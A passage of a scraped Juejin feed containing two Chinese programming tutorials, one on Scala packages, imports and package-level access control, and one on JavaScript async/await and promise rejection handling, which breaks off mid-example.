<span class="hljs-comment">// 定义 com.example 包的包对象</span>
<span class="hljs-keyword">package</span> <span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">example</span> </span>{
  <span class="hljs-comment">// 全局常量（包内所有类可直接使用）</span>
  <span class="hljs-keyword">val</span> <span class="hljs-type">APP_NAME</span>: <span class="hljs-type">String</span> = <span class="hljs-string">"ScalaPackageDemo"</span>
  
  <span class="hljs-comment">// 全局函数（包内所有类可直接调用）</span>
  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printLog</span></span>(msg: <span class="hljs-type">String</span>): <span class="hljs-type">Unit</span> = println(<span class="hljs-string">s"[<span class="hljs-subst">$APP_NAME</span>] <span class="hljs-subst">$msg</span>"</span>)
  
  <span class="hljs-comment">// 全局隐式转换（后续可直接生效）</span>
  <span class="hljs-keyword">implicit</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">stringToInt</span></span>(s: <span class="hljs-type">String</span>): <span class="hljs-type">Int</span> = s.toInt
}
</code></pre>
<h5 data-id="heading-13">包对象的使用（无需导入，直接访问）</h5>
<p>scala</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">package</span> com.example.service

<span class="hljs-keyword">import</span> com.example.model.User

<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
  def test(): <span class="hljs-built_in">Unit</span> = {
    printLog(<span class="hljs-string">"测试包对象函数"</span>)  <span class="hljs-comment">// 直接调用包对象的函数</span>
    println(APP_NAME)          <span class="hljs-comment">// 直接访问包对象的常量</span>
    <span class="hljs-keyword">val</span> num: <span class="hljs-built_in">Int</span> = <span class="hljs-string">"123"</span>       <span class="hljs-comment">// 直接使用包对象的隐式转换（String → Int）</span>
  }
}
</code></pre>
<h5 data-id="heading-14">核心用途：</h5>
<ul>
<li>存储包级别的工具函数 / 常量（如配置、日志工具）；</li>
<li>定义包级别的隐式转换（避免在每个类中重复导入）；</li>
<li>统一管理包内依赖的公共资源。</li>
</ul>
<h3 data-id="heading-15">3. 包的导入（Import）</h3>
<p>Scala 的 <code>import</code> 语法比 Java 更灵活，支持通配、重命名、过滤等功能，核心目的是简化代码中对其他包元素的引用。</p>
<h4 data-id="heading-16">（1）基础导入（与 Java 一致）</h4>
<p>scala</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 导入单个类</span>
<span class="hljs-keyword">import</span> com.example.model.User

<span class="hljs-comment">// 导入多个类（用大括号包裹）</span>
<span class="hljs-keyword">import</span> com.example.model.{User, UserProfile}

<span class="hljs-comment">// 导入整个包（通配符，用 _ 代替 Java 的 *）</span>
<span class="hljs-keyword">import</span> com.example.model._
</code></pre>
<h4 data-id="heading-17">（2）Scala 增强：重命名与过滤</h4>
<p>避免导入冲突（如两个包有同名类），或简化长类名：</p>
<p>scala</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 重命名：将 User 重名为 ModelUser（避免冲突）</span>
<span class="hljs-keyword">import</span> com.example.model.User =&gt; ModelUser

<span class="hljs-comment">// 过滤：导入包中所有类，除了 User（exclude）</span>
<span class="hljs-keyword">import</span> com.example.model.{User =&gt; _, _}  <span class="hljs-comment">// 第一个 _ 表示“排除”，第二个 _ 表示“其余所有”</span>

<span class="hljs-comment">// 示例：解决冲突</span>
<span class="hljs-keyword">import</span> com.a.User
<span class="hljs-keyword">import</span> com.b.User =&gt; BUser  <span class="hljs-comment">// 重命名 com.b.User 为 BUser</span>

val userA = <span class="hljs-keyword">new</span> User(<span class="hljs-string">"A"</span>)
val userB = <span class="hljs-keyword">new</span> BUser(<span class="hljs-string">"B"</span>)  <span class="hljs-comment">// 无冲突</span>
</code></pre>
<h4 data-id="heading-18">（3）Scala 增强：按需导入（局部导入）</h4>
<p><code>import</code> 可在代码任意位置使用（不仅限于文件顶部），实现 “局部导入”（只在当前作用域生效），减少全局导入的冗余：</p>
<p>scala</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
  <span class="hljs-function">def <span class="hljs-title">test</span><span class="hljs-params">()</span>: Unit =</span> {
    <span class="hljs-comment">// 局部导入：只在 test() 方法内生效</span>
    <span class="hljs-keyword">import</span> com.example.model.User
    val user = <span class="hljs-keyword">new</span> <span class="hljs-built_in">User</span>(<span class="hljs-string">"局部导入"</span>)
  }
  
  <span class="hljs-comment">// 此处无法访问 User（超出局部导入作用域）</span>
}
</code></pre>
<h4 data-id="heading-19">（4）隐式导入（Implicit Import）</h4>
<p>Scala 会自动导入以下包，无需手动写 <code>import</code>：</p>
<ul>
<li><code>scala._</code>（Scala 核心类库，如 <code>List</code>、<code>Option</code>）；</li>
<li><code>scala.Predef._</code>（常用函数 / 常量，如 <code>println</code>、<code>String</code>、<code>Int</code>）；</li>
<li>当前包的包对象（如 <code>com.example</code> 包的代码会自动导入 <code>com.example.package</code>）。</li>
</ul>
<h3 data-id="heading-20">4. 包的访问控制</h3>
<p>Scala 的访问权限关键字（<code>private</code>、<code>protected</code>、<code>public</code>）可结合包使用，实现更精细的可见性控制（默认访问权限为 <code>public</code>，与 Java 一致）。</p>
<h4 data-id="heading-21">（1）private：私有访问</h4>
<ul>
<li>默认：<code>private</code> 修饰的元素只能在 <strong>当前类 / 对象内部</strong> 访问；</li>
<li>包级私有：<code>private[包名]</code> 修饰的元素可在 <strong>指定包及其子包</strong> 内访问（Scala 增强特性）。</li>
</ul>
<h5 data-id="heading-22">示例：包级私有</h5>
<p>scala</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">package</span> com.example.model

<span class="hljs-comment">// 包级私有类：只能在 com.example 包及其子包访问</span>
<span class="hljs-keyword">private</span>[example] <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserProfile</span>(<span class="hljs-keyword">val</span> email: String)

<span class="hljs-comment">// 普通类（public）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-keyword">val</span> name: String, <span class="hljs-keyword">val</span> profile: UserProfile)
</code></pre>
<p>scala</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.service

<span class="hljs-keyword">import</span> com.example.model.{User, UserProfile}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
  def <span class="hljs-title function_">test</span><span class="hljs-params">()</span>: Unit = {
    <span class="hljs-type">val</span> <span class="hljs-variable">profile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserProfile</span>(<span class="hljs-string">"alice@example.com"</span>)  <span class="hljs-comment">// 合法：UserProfile 是 com.example 包级私有</span>
    <span class="hljs-type">val</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">"Alice"</span>, profile)
  }
}
</code></pre>
<p>scala</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 外部包（com.other）：无法访问包级私有类</span>
<span class="hljs-keyword">package</span> com.other

<span class="hljs-keyword">import</span> com.example.model.UserProfile

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> {
  <span class="hljs-type">val</span> <span class="hljs-variable">profile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserProfile</span>(<span class="hljs-string">"test@example.com"</span>)  <span class="hljs-comment">// 编译报错：UserProfile 不可见</span>
}
</code></pre>
<h4 data-id="heading-23">（2）protected：受保护访问</h4>
<ul>
<li>默认：<code>protected</code> 修饰的元素只能在 <strong>当前类及其子类</strong> 访问（与 Java 一致）；</li>
<li>包级受保护：<code>protected[包名]</code> 修饰的元素可在 <strong>指定包及其子包 + 子类</strong> 访问。</li>
</ul>
<h5 data-id="heading-24">示例：包级受保护</h5>
<p>scala</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">package</span> com.example.model

<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-keyword">val</span> name: String) {
  <span class="hljs-comment">// 包级受保护方法：com.example 包及其子包 + User 子类可访问</span>
  <span class="hljs-keyword">protected</span>[example] def getDetail: String = s<span class="hljs-string">"User: <span class="hljs-variable">$name</span>"</span>
}
</code></pre>
<p>scala</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> com.example.service

<span class="hljs-keyword">import</span> com.example.model.<span class="hljs-type">User</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserService</span> </span>{
  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span></span>(): <span class="hljs-type">Unit</span> = {
    <span class="hljs-keyword">val</span> user = <span class="hljs-keyword">new</span> <span class="hljs-type">User</span>(<span class="hljs-string">"Alice"</span>)
    println(user.getDetail)  <span class="hljs-comment">// 合法：UserService 在 com.example 包下</span>
  }
}

<span class="hljs-comment">// 子类（无论是否在同一包）都可访问</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AdminUser</span>(<span class="hljs-params">name: <span class="hljs-type">String</span></span>) <span class="hljs-keyword">extends</span> <span class="hljs-title">User</span>(<span class="hljs-params">name</span>) </span>{
  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printDetail</span></span>: <span class="hljs-type">Unit</span> = println(getDetail)  <span class="hljs-comment">// 合法：子类继承 User</span>
}
</code></pre>
<h4 data-id="heading-25">（3）public：公开访问（默认）</h4>
<p>未显式指定访问权限的元素默认是 <code>public</code>，任何包都可访问（与 Java 一致）。</p>
<h3 data-id="heading-26">5. 包的最佳实践</h3>
<ol>
<li><strong>目录与包结构一致</strong>：严格遵循 “包名对应目录路径”，例如 <code>com.example.model</code> 对应 <code>src/main/scala/com/example/model</code>，避免编译器找不到类；</li>
<li><strong>包命名规范</strong>：全小写字母，用反向域名（如 <code>com.company.project</code>），避免中文、特殊字符；</li>
<li><strong>按功能拆分包</strong>：推荐分层结构（如 <code>controller</code>（接口）、<code>service</code>（业务）、<code>model</code>（数据）、<code>util</code>（工具）），而非按类类型拆分；</li>
<li><strong>合理使用包对象</strong>：只放包级公共资源（工具函数、常量），避免将业务逻辑放入包对象；</li>
<li><strong>最小权限原则</strong>：非公开的元素尽量用 <code>private[包名]</code> 或 <code>protected</code> 限制访问，减少耦合；</li>
<li><strong>简化导入</strong>：避免导入冗余（用局部导入、重命名、过滤），减少命名冲突。</li>
</ol>
<h2 data-id="heading-27">总结</h2>
<p>Scala 的包在核心功能（组织代码、避免冲突）上与 Java 一致，但提供了 <strong>嵌套包、包对象、灵活导入、包级访问控制</strong> 等增强特性，更适合复杂项目的模块化管理。关键要点：</p>
<ol>
<li>包结构必须与目录结构一致，否则编译报错；</li>
<li>包对象是 Scala 专属，用于存储包级公共资源；</li>
<li>访问控制可通过 <code>private[包名]</code> 实现包级可见性，比 Java 更灵活；</li>
<li>导入语法支持重命名、过滤、局部导入，简化代码编写。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[js中async和await 的详细讲解]]></title>    <link>https://juejin.cn/post/7575457788664528948</link>    <guid>https://juejin.cn/post/7575457788664528948</guid>    <pubDate>2025-11-24T04:00:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575457788664528948" data-draft-id="7576077034742759458" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="js中async和await 的详细讲解"/> <meta itemprop="keywords" content="前端,JavaScript,Vue.js"/> <meta itemprop="datePublished" content="2025-11-24T04:00:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="我的div丢了肿么办"/> <meta itemprop="url" content="https://juejin.cn/user/1310273593440398"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            js中async和await 的详细讲解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1310273593440398/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    我的div丢了肿么办
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T04:00:02.000Z" title="Mon Nov 24 2025 04:00:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;color:#3c9dff}.markdown-body h1{font-size:30px;margin-bottom:5px;padding-bottom:8px;text-align:center}.markdown-body h2{font-size:24px;padding-bottom:6px}.markdown-body h2:before{content:"🍋"}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{content:"🍓"}.markdown-body h4{font-size:16px}.markdown-body h4:before{content:"🍑"}.markdown-body h5{font-size:15px}.markdown-body h5:before{content:"🍉"}.markdown-body h6{margin-top:5px}.markdown-body h6:before{content:"🍒"}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;margin:0 auto;max-width:100%;border-radius:4px;padding:1px;border:1px solid #d2e8ff}.markdown-body img:hover{box-shadow:0 1px 3px #5eaeff}.markdown-body hr{height:4px;margin:34px 0;background-size:4px 1px;background-image:linear-gradient(270deg,#5eaeff,#f3f9ff 25%,transparent 50%);border-style:none}.markdown-body code{word-break:break-word;border-radius:3px;overflow-x:auto;background-color:#d2e8ff;color:#3c9dff;font-size:.9em;padding:.1em .5em;margin:0 3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;transition:all .3s}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:1px solid #90c7ff;border-radius:4px}.markdown-body pre:hover{box-shadow:0 1px 10px #beddff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#3c9dff;border-bottom:1px solid #90c7ff;transition:all .3s}.markdown-body a:hover{color:#007fff;border-bottom:2px solid #5eaeff}.markdown-body a[href]:not(:empty){padding-right:18px}.markdown-body a[href]:not(:empty):after{display:inline-block;width:16px;height:16px;margin-left:2px;content:"";background:url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxwYXRoIGQ9Ik0zODQgMTI4YTQ4IDQ4IDAgMDEyLjgxNiA5NS45MkwzODQgMjI0SDI1NmEzMiAzMiAwIDAwLTMxLjkyIDI5LjZMMjI0IDI1NnY1MTJhMzIgMzIgMCAwMDI5LjYgMzEuOTJsMi40LjA4aDUxMmEzMiAzMiAwIDAwMzEuOTItMjkuNmwuMDgtMi40VjY1NmE0OCA0OCAwIDAxOTUuOTItMi44MTZMODk2IDY1NnYxMTJhMTI4IDEyOCAwIDAxLTEyNCAxMjcuOTM2bC00IC4wNjRIMjU2YTEyOCAxMjggMCAwMS0xMjcuOTM2LTEyNGwtLjA2NC00VjI1NmExMjggMTI4IDAgMDExMjQtMTI3LjkzNmw0LS4wNjRoMTI4em0zODQgMGExMjggMTI4IDAgMDExMjcuOTM2IDEyNGwuMDY0IDR2MTYwYTQ4IDQ4IDAgMDEtOTUuOTIgMi44MTZMODAwIDQxNlYyOTEuODcybC0zODIuMDY0IDM4Mi4wOGE0OCA0OCAwIDAxLTcwLjAzMi02NS42bDIuMTYtMi4yODhMNzMyLjA5NiAyMjRINjA4YTQ4IDQ4IDAgMDEtMi44MTYtOTUuOTJMNjA4IDEyOGgxNjB6IiBmaWxsPSIjM2M5ZGZmIiBmaWxsLW9wYWNpdHk9Ii41NiIgZGF0YS1zcG0tYW5jaG9yLWlkPSJhMzEzeC5zZWFyY2hfaW5kZXguMC5pMC41Yzc1M2E4MTgwa2RKWCIgY2xhc3M9InNlbGVjdGVkIi8+PC9zdmc+);background-size:100%}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border:1px solid #3c9dff}.markdown-body thead{text-align:center}.markdown-body thead th{color:#fff;background-color:#5eaeff}.markdown-body tr{text-align:center}.markdown-body tbody tr:hover{background-color:#d2e8ff}.markdown-body tbody tr:hover code{background-color:#90c7ff}.markdown-body tr:nth-child(2n){background-color:#ecf5ff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5eaeff}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{font-weight:900;padding:0 1px;font-size:17px}.markdown-body small{color:#cbcbcb;padding:0 1px;font-size:22px;zoom:.5}.markdown-body em{padding:0 1px}.markdown-body del{padding:0 1px;text-decoration-thickness:2px}.markdown-body blockquote{color:#1a1b1c;padding:1px 20px;margin:22px 0;border-radius:4px;border-left:4px solid rgba(60,157,255,.5);background-color:rgba(190,221,255,.3)}.markdown-body blockquote blockquote{margin:8px 0}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{margin:12px 0;padding:4px 10px;border:2px solid #3c9dff;border-radius:8px;background-color:#ecf5ff;transition:all .3s}.markdown-body details summary{cursor:pointer}.markdown-body input[type=checkbox]{position:relative;appearance:none;width:16px;height:16px;border-radius:2px;vertical-align:middle;transform:translateY(-2px);box-sizing:border-box;border:1px solid #beddff}.markdown-body input[type=checkbox]:checked{border:1px solid #5eaeff;background-color:#5eaeff}.markdown-body input[type=checkbox]:checked:before{position:absolute;top:3px;left:1px;width:11px;height:6px;background-color:transparent;border-left:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(-45deg);content:"";box-sizing:border-box}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="androidstudio">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#a9b7c6;background:#282b2e}.hljs-bullet,.hljs-literal,.hljs-number,.hljs-symbol{color:#6897bb}.hljs-deletion,.hljs-keyword,.hljs-selector-tag{color:#cc7832}.hljs-link,.hljs-template-variable,.hljs-variable{color:#629755}.hljs-comment,.hljs-quote{color:grey}.hljs-meta{color:#bbb529}.hljs-addition,.hljs-attribute,.hljs-string{color:#6a8759}.hljs-section,.hljs-title,.hljs-type{color:#ffc66d}.hljs-name,.hljs-selector-class,.hljs-selector-id{color:#e8bf6a}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0">async 函数永远会返回一个promise,即使你在函数中没有返回任何值。</h4>
<p>async 函数永远会返回一个promise,即使你在函数中没有返回任何值。<br/>
因为：返回没有返回值时函数默认返回的是 undefined.<br/>
所以：会返回一个 promise，这个 promise 的 值为 undefined。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doThingFn</span>(<span class="hljs-params"/>){
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'doThingFn'</span>)
}

<span class="hljs-comment">// async 函数永远会返回一个promise,即使你在函数中没有返回任何值。</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">111</span>, <span class="hljs-title function_">doThingFn</span>())

<span class="hljs-comment">// 输出的值是 undefined</span>
<span class="hljs-comment">// 因为async 函数会返回一个promise, 所以我们是可以写then的。</span>
<span class="hljs-title function_">doThingFn</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span>=&gt;</span>{
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'输出的值是'</span>,res)
})
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bceed9a3fe444f3899a47aceda0c4a81~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR55qEZGl25Lii5LqG6IK_5LmI5Yqe:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764561602&amp;x-signature=wMre96k%2FQuFIeVuMKlPeYCZ6b0s%3D" alt="image" loading="lazy"/></p>
<h4 data-id="heading-1">async 函数的返回是Promise.resolve</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doThingFn</span>(<span class="hljs-params"/>){
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'doThingFn'</span>)
}
</code></pre>
<p>等于与下面的</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doThingFn</span>(<span class="hljs-params"/>){
  <span class="hljs-comment">// 返回没有返回值时函数默认返回的是 undefined.</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-literal">undefined</span>)
}
</code></pre>
<h4 data-id="heading-2">当 await 遇到一个被拒绝的 Promise 时，它会抛出异常。因此需要被捕获</h4>
<p>下面依次输出的结果是：A</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doThingFn</span>(<span class="hljs-params"/>){
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'A'</span>)
  <span class="hljs-keyword">const</span> result2 = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-string">'B'</span>)
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'C'</span>)
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-string">'D'</span> )
}
<span class="hljs-title function_">doThingFn</span>()
</code></pre>
<p>为啥只会输出:A ？<br/>
因为当 await 遇到一个被拒绝的 Promise 时，它会抛出异常。我们没有捕获，直接就会报错的。<br/>
因此下面的 C 不会输出。</p>
<h4 data-id="heading-3">为啥不会输出 C</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doThingFn</span>(<span class="hljs-params"/>){
  <span class="hljs-keyword">try</span>{
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'A'</span>)
    <span class="hljs-keyword">const</span> result2 = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-string">'B'</span>)
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'C'</span>)
  }<span class="hljs-keyword">catch</span>(err){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'err'</span>,err)
  }
}
<span class="hljs-title function_">doThingFn</span>()
</code></pre>
<p>分析：当 await 遇到被拒绝的 Promise 时(就是说：Promise.reject)：<br/>
立即抛出异常，中断当前代码块的执行。<br/>
（如果有catch）, 直接跳转到最近的 catch 块<br/>
await 之后的代码不会执行,因此不会输出 C。</p>
<h4 data-id="heading-4">如何让他输出C</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doThingFn</span>(<span class="hljs-params"/>){
  <span class="hljs-keyword">try</span>{
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'A'</span>)
    <span class="hljs-comment">// 我们在这里将它捕获掉。这样就可以输出C</span>
    <span class="hljs-keyword">const</span> result2 = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-string">'B'</span>).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span>=&gt;</span>{
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'err'</span>,err)
    })
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'C'</span>)
  }<span class="hljs-keyword">catch</span>(err){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'err'</span>,err)
  }
}
<span class="hljs-title function_">doThingFn</span>()
</code></pre>
<h4 data-id="heading-5">如何正确获取到B的值</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">timeOutFn</span>(<span class="hljs-params"/>){
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>{
    <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'B'</span>)
  },<span class="hljs-number">5000</span>)
}
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doThingFn</span>(<span class="hljs-params"/>){
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'A'</span>)
  <span class="hljs-comment">// 如何让这里正确获取到B的值</span>
  <span class="hljs-keyword">const</span> result2 = <span class="hljs-keyword">await</span> <span class="hljs-title function_">timeOutFn</span>()
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result2)
}
<span class="hljs-title function_">doThingFn</span>()
</code></pre>
<p>这样就可以获取到值啦~~~</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">timeOutFn</span>(<span class="hljs-params"/>){
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve,reject</span>)=&gt;</span>{
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>{
      <span class="hljs-title function_">resolve</span>(<span class="hljs-string">'B'</span>)
    },<span class="hljs-number">5000</span>)
  })
}

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doThingFn</span>(<span class="hljs-params"/>){
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'A'</span>)
  <span class="hljs-comment">// return new Promise(...) 是 timeOutFn 函数的返回值</span>
  <span class="hljs-keyword">const</span> result2 = <span class="hljs-keyword">await</span> <span class="hljs-title function_">timeOutFn</span>()
